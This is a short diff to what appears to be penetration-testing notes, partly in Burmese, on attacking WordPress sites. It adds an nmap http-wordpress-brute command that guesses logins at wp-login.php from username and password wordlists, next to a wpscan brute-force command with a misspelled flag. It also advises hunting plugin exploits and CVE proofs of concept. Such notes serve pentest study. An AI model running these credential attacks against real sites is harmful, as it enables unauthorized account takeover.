@@ -95,6 +95,10 @@ wpscan --url http://target.com > wpscan.txt
   ```shell
   wpscan --url http://target.com/ --passwrod /usr/share/wordlists/rockyou.txt --username username.txt
   ```
+## Brute Force wtih nmap 
+```shell
+nmap --script http-wordpress-brute --script-args 'userdb=/usr/share/wordlists/commonusernames.txt,passdb=/usr/share/wordlists/1000commonpasswords.txt,brute.firstonly=true,http-wordpress-brute.uri=/wp-login.php' target.com
+```
 
 ## Result ကို ကြည့်ပြီး ဘာတွေလုပ်မလဲ
 - Vulnerable plugin ခေါင်းစဉ်တွေအလိုက် exploit တွေရှာကြည့်ပါ။ မတွေ့ဘူးဆိုရင်တော့ cve တွေဘယ်လိုရခဲ့လဲ POC တွေ လိုက်ကြည့်ပြီး manual လုပ်ကြည့်မှရမှာပါ။
